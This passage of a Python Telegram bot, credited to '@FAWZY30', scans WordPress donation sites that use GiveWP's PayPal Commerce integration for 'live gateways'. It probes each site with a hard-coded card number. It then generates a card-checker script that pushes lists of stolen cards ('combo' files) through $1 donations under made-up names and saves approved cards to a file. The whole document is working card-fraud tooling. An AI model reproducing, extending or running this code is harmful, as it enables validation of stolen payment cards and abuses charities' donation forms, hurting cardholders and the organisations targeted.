                response_data = response.json()
                if 'id' in response_data:
                    return response_data['id']
            return None
        except:
            return None

    def _approve_order(self, order_id):
        if self.ajax_url and 'admin-ajax' in self.ajax_url:
            result = self._approve_order_givewp(order_id)
            if result:
                return result
        if self.access_token:
            try:
                headers = {'authorization': f'Bearer {self.access_token}', 'content-type': 'application/json', 'user-agent': self.get_next_ua()}
                response = self.r.post(f'https://api-m.paypal.com/v2/checkout/orders/{order_id}/capture', headers=headers, timeout=10)
                return response
            except:
                pass
        return None

    def _approve_order_givewp(self, order_id):
        if not self.ajax_url:
            return None
        amounts = []
        if self.minimum_amount != "1.00":
            amounts.append(self.minimum_amount)
        amounts.extend(["5.00", "10.00", "18.50", "25.00", "36.50", "50.00", "100.00"])
        headers = {'user-agent': self.get_next_ua(), 'accept': 'application/json, text/javascript, */*; q=0.01', 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
        actions = ['give_paypal_commerce_approve_order', 'give_approve_order', 'approve_order']
        for amount in amounts:
            form_data = self.get_base_form_data()
            form_data['give-amount'] = amount
            form_data['amount'] = amount
            for action in actions:
                params = {'action': action, 'order': order_id}
                try:
                    response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=10)
                    if response.status_code == 200:
                        return response
                except:
                    continue
        return None

    def _clean_response(self, text):
        if not text:
            return "DECLINED"
        text_strip = text.strip()
        text_lower = text_strip.lower()

        if text_lower == 'true':
            return 'CHARGE 1.0'

        try:
            approve_json = json.loads(text_strip)
            if isinstance(approve_json, dict):
                if approve_json.get('success') is True:
                    data = approve_json.get('data', {})
                    if isinstance(data, dict):
                        order = data.get('order', {})
                        if isinstance(order, dict):
                            order_status = str(order.get('status', '')).upper()
                            payment_source = order.get('payment_source', {})
                            card = payment_source.get('card', {}) if isinstance(payment_source, dict) else {}
                            
                            if order_status == 'COMPLETED' and card:
                                return 'CHARGE 1.0'
        except:
            pass

        if 'insufficient' in text_lower:
            return 'INSUFFICIENT_FUNDS'

        for pr in self.paypal_responses:
            if pr in text_strip.upper():
                if pr == 'ORDER_NOT_APPROVED':
                    return "Payer cannot pay for this transaction."
                return pr

        if len(text_strip) < 100:
            return "PAYER_ACTION_REQUIRED"

        return text_strip[:200]

    def Charge(self, ccx):
        try:
            if not self.is_valid_gateway:
                return "INVALID_GATEWAY"
            parts = ccx.strip().split("|")
            if len(parts) < 4:
                return "Invalid card format"
            n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
            if "20" in yy:
                yy = yy.split("20")[1]
            expiry = f"20{yy}-{mm}"
            order_id = self._create_order()
            if not order_id:
                return "Create Order Failed"
            auth_tokens = []
            if self.client_token:
                auth_tokens.append(self.client_token)
            if self.access_token:
                auth_tokens.append(self.access_token)
            if self.client_id:
                auth_tokens.append(self.client_id)
            confirm_res = None
            confirm_json = {}
            confirm_text = ""
            for auth_token in auth_tokens:
                he4 = {'authorization': f'Bearer {auth_token}', 'paypal-client-metadata-id': self.client_id or '', 'user-agent': self.get_next_ua()}
                da3 = {'payment_source': {'card': {'number': n, 'expiry': expiry, 'security_code': cvc, 'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}}}, 'application_context': {'vault': False}}
                try:
                    confirm_res = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', headers=he4, json=da3, timeout=10)
                    confirm_text = confirm_res.text
                    if confirm_res.status_code == 200:
                        try:
                            confirm_json = confirm_res.json()
                        except:
                            confirm_json = {}
                        break
                except:
                    continue

            if isinstance(confirm_json, dict):
                if 'details' in confirm_json and len(confirm_json['details']) > 0:
                    detail = confirm_json['details'][0]
                    issue = detail.get('issue', '')
                    description = detail.get('description', '')
                    if issue:
                        if issue == 'ORDER_NOT_APPROVED':
                            return "Payer cannot pay for this transaction."
                        if description:
                            return f"{issue}: {description}"
                        return issue
                if 'name' in confirm_json:
                    name = confirm_json.get('name', '')
                    if name in self.paypal_responses:
                        msg = confirm_json.get('message', '')
                        if msg:
                            return f"{name}: {msg}"
                        return name
                if 'message' in confirm_json:
                    return confirm_json.get('message', '')

            if confirm_text:
                try:
                    text_json = json.loads(confirm_text)
                    if isinstance(text_json, dict):
                        if 'details' in text_json and len(text_json['details']) > 0:
                            detail = text_json['details'][0]
                            issue = detail.get('issue', '')
                            description = detail.get('description', '')
                            if issue:
                                if issue == 'ORDER_NOT_APPROVED':
                                    return "Payer cannot pay for this transaction."
                                if description:
                                    return f"{issue}: {description}"
                                return issue
                        if 'name' in text_json:
                            name = text_json.get('name', '')
                            if name in self.paypal_responses:
                                msg = text_json.get('message', '')
                                if msg:
                                    return f"{name}: {msg}"
                                return name
                except:
                    pass
                issue_matches = re.findall(r'"issue"\s*:\s*"([^"]+)"', confirm_text)
                if issue_matches:
                    issue = issue_matches[0]
                    if issue == 'ORDER_NOT_APPROVED':
                        return "Payer cannot pay for this transaction."
                    desc_matches = re.findall(r'"description"\s*:\s*"([^"]+)"', confirm_text)
                    if desc_matches:
                        return f"{issue}: {desc_matches[0]}"
                    return issue
                name_matches = re.findall(r'"name"\s*:\s*"([^"]+)"', confirm_text)
                if name_matches:
                    name = name_matches[0]
                    if name in self.paypal_responses:
                        msg_matches = re.findall(r'"message"\s*:\s*"([^"]+)"', confirm_text)
                        if msg_matches:
                            return f"{name}: {msg_matches[0]}"
                        return name

            approve_res = self._approve_order(order_id)
            text = approve_res.text if approve_res else ''

            if text:
                return self._clean_response(text)

            return "DECLINED"
        except Exception as e:
            return f"Error: {e}"

# ═══════════════════════ أمر سحب PayPal ═══════════════════════

@bot.message_handler(func=lambda m: m.text.lower().startswith('/paypal'))
def ali_al2(massege):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(massege.from_user.id) in blocked:
        safe_send_message(massege.chat.id, 'The admin has blocked you.')
        return

    ko = safe_send_message(massege.chat.id, "- The gate is being withdrawn ...")
    if not ko:
        return
    time.sleep(1)
    
    try:
        parts = massege.text.split(maxsplit=1)
        if len(parts) != 2:
            safe_edit_message(massege.chat.id, ko.message_id, '''- Please send the link like this:\n\n<code>/paypal https://xxxxxxx.xxx/xxxx</code>''')
            return

        link = parts[1].strip()

        if not link.startswith(("http://", "https://")):
            safe_edit_message(massege.chat.id, ko.message_id, "Invalid link format ❌")
            return

        r = requests.get(link, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
        if r.status_code != 200:
            safe_edit_message(massege.chat.id, ko.message_id, f"Site returned status: {r.status_code} ❌")
            return

        time.sleep(1)
        safe_edit_message(massege.chat.id, ko.message_id, "Gate found ✅")

    except:
        pass

    try:
        paypal = PayPalCommerce(target_url=link)
        result = paypal.Charge('5143772354638703|05|28|886')
        
        is_live = False
        for pr in PAYPAL_RESPONSES:
            if pr.lower() in result.lower():
                is_live = True
                break
        
        for dr in DEAD_RESPONSES:
            if dr.lower() in result.lower():
                safe_edit_message(massege.chat.id, ko.message_id, f"❌ <b>Dead:</b> <code>{link}</code>\n📝 <b>Response:</b> {result}")
                paypal.r.close()
                return
        
        if not is_live:
            safe_edit_message(massege.chat.id, ko.message_id, f"❌ <b>Dead:</b> <code>{link}</code>\n📝 <b>Response:</b> {result}")
            paypal.r.close()
            return

        file_name = f'gateway_{int(time.time())}.py'
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(generate_gateway_code(result))
        
        safe_send_document(massege.chat.id, file_name, caption=f'''✅ <b>Live Gateway Found!</b>\n━━━━━━━━━━━━━━━━━━━━\n🔗 Link: <code>{link}</code>\n━━━━━━━━━━━━━━━━━━━━\n💬 <b>Response:</b> <code>{result}</code>\n━━━━━━━━━━━━━━━━━━━━\nDev: @FAWZY30''')
        os.remove(file_name)
        paypal.r.close()

    except Exception as e:
        print(f"Error in ali_al2: {e}")
        if 'paypal' in locals():
            try:
                paypal.r.close()
            except:
                pass

# ═══════════════════════ أمر mass ═══════════════════════

@bot.message_handler(commands=['mass'])
def mass_extract_start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        safe_send_message(message.chat.id, 'The admin has blocked you.')
        return

    msg = safe_send_message(message.chat.id, "📁 Send a .txt file with links (one link per line):")
    if msg:
        bot.register_next_step_handler(msg, process_mass_file)

@bot.message_handler(commands=['stop'])
def stop_mass(message):
    user_id = message.from_user.id
    if user_id in processing_status:
        processing_status[user_id]['stop_flag'] = True
        safe_send_message(message.chat.id, "🛑 Stopping...")
    else:
        safe_send_message(message.chat.id, "❌ No active process.")

def check_single_link(link):
    paypal = None
    try:
        if not link.startswith(("http://", "https://")):
            return {'link': link, 'live': False, 'respons': 'Invalid URL'}
        
        paypal = PayPalCommerce(target_url=link)
        result = paypal.Charge('5143772354638703|05|28|886')
        
        is_live = False
        for pr in PAYPAL_RESPONSES:
            if pr.lower() in result.lower():
                is_live = True
                break
        
        for dr in DEAD_RESPONSES:
            if dr.lower() in result.lower():
                return {'link': link, 'live': False, 'respons': result}
        
        if is_live:
            return {
                'link': link,
                'live': True,
                'respons': result,
                'id_form1': paypal.form_data.get('give-form-id-prefix', ''),
                'id_form2': paypal.form_data.get('give-form-id', ''),
                'nonec': paypal.form_data.get('give-form-hash', ''),
                'au': paypal.client_token or paypal.access_token or '',
            }
        
        return {'link': link, 'live': False, 'respons': result}
        
    except Exception as e:
        return {'link': link, 'live': False, 'respons': str(e)[:100]}
    finally:
        if paypal and hasattr(paypal, 'r'):
            try:
                paypal.r.close()
            except:
                pass

def generate_gateway_code(result):
    """توليد كود Gateway من بيانات result"""
    return f'''import requests, re, random, time, base64
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse

class PayPal:
    def __init__(self):
        self.first_name = ["James", "John", "Robert", "Michael", "William"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
        self.donation = "1.00"
        self.id_form1 = "{result['id_form1']}"
        self.id_form2 = "{result['id_form2']}"
        self.nonec = "{result['nonec']}"
        self.au = "{result['au']}"
        url = '{result['link']}'
        parsed = urlparse(url)
        self.url = parsed.netloc
        self.inurl = parsed.path
        self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"
        self.r = requests.Session()
        self.uu = UserAgent()
        self.checked = 0

    def Key(self):
        return self.au, self.id_form1, self.id_form2, self.nonec

    def Charge(self, ccx):
        self.checked += 1
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        if "20" in yy:
            yy = yy.split("20")[1]
        
        da2 = MultipartEncoder({{
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.nonec),
            'give-amount': (None, self.donation),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
        }})
        he3 = {{'content-type': da2.content_type, 'user-agent': self.uu.random}}
        pa1 = {{'action': 'give_paypal_commerce_create_order'}}
        r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa1, headers=he3, data=da2).json()['data']['id']

        he4 = {{'authorization': f'Bearer {{self.au}}', 'paypal-client-metadata-id': self.paypal, 'user-agent': self.uu.random}}
        da3 = {{
            'payment_source': {{
                'card': {{
                    'number': n, 'expiry': f'20{{yy}}-{{mm}}', 'security_code': cvc,
                    'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
                }},
            }},
            'application_context': {{'vault': False}},
        }}
        self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{r3}}/confirm-payment-source', headers=he4, json=da3)

        da4 = MultipartEncoder({{
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.nonec),
            'give-amount': (None, self.donation),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
        }})
        he5 = {{'content-type': da4.content_type, 'user-agent': self.uu.random}}
        pa2 = {{'action': 'give_paypal_commerce_approve_order', 'order': r3}}
        r5 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa2, headers=he5, data=da4)
        
        text = r5.text
        if 'true' in text: return 'CHARGE 1.00$'
        elif 'INSUFFICIENT_FUNDS' in text: return "INSUFFICIENT_FUNDS"
        elif 'ORDER_NOT_APPROVED' in text: return "Payer cannot pay for this transaction."
        else:
            try: return r5.json()['data']['error']
            except: return "UNKNOWN_ERROR"

if __name__ == '__main__':
    Getat = 'PayPal Custom 1$'
    print(f'Cheker {{Getat}}')
    Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
    if Br == '1':
        while True:
            ar = input('Enter Card ( n | mm | yy | cvc ): ')
            rr = PayPal()
            itt = rr.Key()
            resulti = rr.Charge(ar)
            if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                with open('Approved Card.txt', "a") as f:
                    f.write(ar + f': {{resulti}} > {{Getat}}')
            print('Response: ' + resulti)
            time.sleep(5)
    else:
        noy = 0
        cr = input('Enter Name Combo: ')
        with open(cr, "r") as f:
            crads = f.read().splitlines()
            for P in crads:
                noy += 1
                try:
                    rr = PayPal()
                    itt = rr.Key()
                    resulti = rr.Charge(P)
                except Exception as e:
                    resulti = f'Error {{e}}'
                if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                    with open('Approved Card.txt', "a") as f:
                        f.write(P + ': {{resulti}} > {{Getat}}')
                print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
                time.sleep(13)'''

def process_mass_file(message):
    if not message.document:
        safe_send_message(message.chat.id, "❌ Please send a .txt file.")
        return

    try:
        file_info = safe_get_file(message.document.file_id)
        if not file_info:
            safe_send_message(message.chat.id, "❌ Failed to get file. Please try again.")
            return
            
        downloaded_file = safe_download_file(file_info.file_path)
        if not downloaded_file:
            safe_send_message(message.chat.id, "❌ Failed to download file. Please try again.")
            return
            
        links = downloaded_file.decode('utf-8', errors='ignore').splitlines()
        links = [link.strip() for link in links if link.strip()]

        if not links:
            safe_send_message(message.chat.id, "❌ File is empty.")
            return

        total = len(links)
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        processing_status[user_id] = {
            'total': total, 'processed': 0, 'live': 0, 'dead': 0,
            'lock': threading.Lock(), 'current_url': '', 'current_respons': '',
            'stop_flag': False, 'done': False, 'last_update': time.time()
        }
        
        status_msg = safe_send_message(chat_id, f"""📊 <b>File #1 - Scanning links...</b>\n━━━━━━━━━━━━━━━━━━\n📌 Total Links: {total}\n✅ Live: 0\n❌ Dead: 0\n⏳ Progress: 0% ░░░░░░░░░░░░░░░░░░░░\nUrl : ...\nRespons : ...\n━━━━━━━━━━━━━━━━━━\n⏱️ Checked 0 of {total}\n🛑 /stop to stop""")
        
        if not status_msg:
            return

        def update_status():
            last_text = ""
            last_edit_time = time.time()
            min_edit_interval = 20
            consecutive_errors = 0
            
            while True:
                time.sleep(15)
                try:
                    if time.time() - last_edit_time < min_edit_interval:
                        continue
                    
                    with processing_status[user_id]['lock']:
                        if processing_status[user_id].get('done', False):
                            break
                        processed = processing_status[user_id]['processed']
                        live = processing_status[user_id]['live']
                        dead = processing_status[user_id]['dead']
                        current_url = processing_status[user_id]['current_url']
                        current_respons = processing_status[user_id]['current_respons']
                        percent = int((processed / total) * 100) if total > 0 else 0
                        bar_length = 20
                        filled = int((percent / 100) * bar_length)
                        bar = '█' * filled + '░' * (bar_length - filled)
                        text = f"""📊 <b>File #1 - Scanning links...</b>\n━━━━━━━━━━━━━━━━━━\n📌 Total Links: {total}\n✅ Live: {live}\n❌ Dead: {dead}\n⏳ Progress: {percent}% {bar}\nUrl : <code>{current_url[:60] if current_url else '...'}</code>\nRespons : <code>{current_respons[:60] if current_respons else '...'}</code>\n━━━━━━━━━━━━━━━━━━\n⏱️ Checked {processed} of {total}\n🛑 /stop to stop"""
                        
                        if text != last_text:
                            try:
                                bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
                                last_text = text
                                last_edit_time = time.time()
                                consecutive_errors = 0
                            except Exception as e:
                                error_str = str(e)
                                
                                if "502" in error_str or "Bad Gateway" in error_str:
                                    consecutive_errors += 1
                                    print(f"⚠️ 502 in update_status - error #{consecutive_errors}")
                                    if consecutive_errors > 5:
                                        time.sleep(30)
                                    else:
                                        time.sleep(10)
                                        
                                elif "429" in error_str:
                                    wait_time = 30
                                    try:
                                        wait_time = int(error_str.split("retry after ")[1].split(")")[0])
                                    except:
                                        pass
                                    print(f"⏳ FloodWait in update_status: {wait_time}s")
                                    time.sleep(min(wait_time, 60))
                                    
                                else:
                                    pass
                except:
                    pass

        updater = threading.Thread(target=update_status, daemon=True)
        updater.start()

        time.sleep(2)

        for idx, link in enumerate(links):
            if processing_status[user_id].get('stop_flag', False):
                break
            
            with processing_status[user_id]['lock']:
                processing_status[user_id]['current_url'] = link
                processing_status[user_id]['current_respons'] = 'Checking...'
            
            result = check_single_link(link)
            
            with processing_status[user_id]['lock']:
                processing_status[user_id]['processed'] += 1
                if result and result.get('live'):
                    processing_status[user_id]['live'] += 1
                    live_idx = processing_status[user_id]['live']
                    processing_status[user_id]['current_respons'] = result['respons']
                    
                    try:
                        code = generate_gateway_code(result)
                        file_name = f'gateway_{live_idx}.py'
                        with open(file_name, 'w', encoding='utf-8') as f:
                            f.write(code)
                        
                        safe_send_document(chat_id, file_name, caption=f"""✅ <b>Live Gateway #{live_idx}</b>\n━━━━━━━━━━━━━━━━━━━━\n🔗 Link: <code>{result['link']}</code>\n━━━━━━━━━━━━━━━━━━━━\n💬 <b>Respons:</b> <code>{result['respons']}</code>\n━━━━━━━━━━━━━━━━━━━━\nDev: @FAWZY30""")
                        
                        try:
                            os.remove(file_name)
                        except:
                            pass
                        time.sleep(3)
                    except Exception as e:
                        print(f"Error sending file: {e}")
                else:
                    processing_status[user_id]['dead'] += 1
                    processing_status[user_id]['current_respons'] = result.get('respons', 'Dead') if result else 'Dead'
            
            if idx % 10 == 0:
                time.sleep(3)
            else:
                time.sleep(1)
            
            if idx % 100 == 0 and idx > 0:
                gc.collect()
                print(f"✅ GC collected - Processed {idx} links")
        
        with processing_status[user_id]['lock']:
            processing_status[user_id]['done'] = True
            processed = processing_status[user_id]['processed']
            live = processing_status[user_id]['live']
            dead = processing_status[user_id]['dead']
        
        updater.join(timeout=5)
        
        final_text = f"""📊 <b>✅ Complete!</b>\n━━━━━━━━━━━━━━━━━━\n📌 Total Links: {total}\n✅ Live (Sent): {live}\n❌ Dead: {dead}\n💯 Success Rate: {int((live/total)*100) if total > 0 else 0}%\n━━━━━━━━━━━━━━━━━━\nDev: @FAWZY30"""
        
        try:
            safe_edit_message(chat_id, status_msg.message_id, final_text)
        except:
            safe_send_message(chat_id, final_text)
        
        if user_id in processing_status:
            del processing_status[user_id]
            
    except Exception as e:
        print(f"❌ Error in process_mass_file: {e}")
        safe_send_message(message.chat.id, f"❌ Error: {str(e)[:100]}")
        if 'user_id' in locals() and user_id in processing_status:
            del processing_status[user_id]

# ═══════════════════════ نظام الحظر ═══════════════════════

@bot.message_handler(commands=['block2'])
def block_user(message):
    if str(message.from_user.id) not in admins:
        safe_send_message(message.chat.id, "You do not have permission.")
        return
    try:
        user_id_to_block = message.text.split()[1]
        with open('blockusers.txt', 'a') as file:
            file.write(f"{user_id_to_block}\n")
        safe_send_message(message.chat.id, f"✅ User ID {user_id_to_block} blocked.")
    except:
        safe_send_message(message.chat.id, "Usage: /block2 [user_id]")

@bot.message_handler(commands=['unblock2'])
def unblock_user(message):
    if str(message.from_user.id) not in admins:
        safe_send_message(message.chat.id, "You do not have permission.")
        return
    try:
        user_id_to_unblock = message.text.split()[1]
        with open('blockusers.txt', 'r') as file:
            lines = file.readlines()
        with open('blockusers.txt', 'w') as file:
            for line in lines:
                if line.strip() != user_id_to_unblock:
                    file.write(line)
        safe_send_message(message.chat.id, f"✅ User ID {user_id_to_unblock} unblocked.")
    except:
        safe_send_message(message.chat.id, "Usage: /unblock2 [user_id]")

# ═══════════════════════ تشغيل البوت ═══════════════════════

print('✅ Bot is running...')

if __name__ == '__main__':
    while True:
        try:
            print("🔄 Starting bot polling...")
            bot.polling(none_stop=True, interval=0, timeout=30, long_polling_timeout=30)
            
        except KeyboardInterrupt:
            print('🛑 Bot stopped by user')
            break
            
        except Exception as e:
            error_str = str(e)
            
            if "502" in error_str or "Bad Gateway" in error_str:
                print(f'⚠️ 502 Bad Gateway - Telegram server issue. Waiting 10s...')
                time.sleep(10)
                continue
                
            elif "409" in error_str:
                print(f'⚠️ 409 Conflict - Another instance running. Waiting 15s...')
                time.sleep(15)
                continue
                
            elif "429" in error_str:
                print(f'⚠️ 429 Too Many Requests. Waiting 30s...')
                time.sleep(30)
                continue
                
            elif "ReadTimeout" in error_str or "timeout" in error_str.lower():
                print(f'⚠️ Timeout. Retrying in 5s...')
                time.sleep(5)
                continue
                
            elif "Connection" in error_str or "ConnectionError" in error_str:
                print(f'⚠️ Connection error. Retrying in 5s...')
                time.sleep(5)
                continue
                
            elif "500" in error_str or "Internal Server Error" in error_str:
                print(f'⚠️ 500 Internal Server Error. Retrying in 10s...')
                time.sleep(10)
                continue
                
            else:
                print(f'❌ Unexpected error: {error_str[:200]}')
                time.sleep(5)
                continue
